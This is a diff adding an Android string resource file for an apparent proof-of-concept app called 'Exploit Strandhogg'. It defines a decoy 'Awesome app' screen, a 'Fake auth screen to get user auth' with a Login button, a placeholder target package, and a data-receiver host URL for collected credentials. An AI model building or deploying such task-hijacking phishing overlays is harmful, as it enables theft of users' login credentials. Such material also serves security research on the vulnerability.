@@ -1,0 +1,13 @@
+<resources>
+    <string name="app_name">Exploit Strandhogg</string>
+    <string name="start">Start</string>
+    <string name="inoffensive_app">Inoffensive Screen</string>
+    <string name="inoffensive_title">Awesome app</string>
+    <string name="smile">😊</string>
+    <string name="trololo">trololo</string>
+    <string name="fake_message">Fake auth screen to get user auth</string>
+    <string name="go_to_original_app">Login</string>
+    <string name="hostname">https://host.receiver.data/</string>
+    <string name="target_package" translatable="false">com.target.package</string>
+</resources>
+
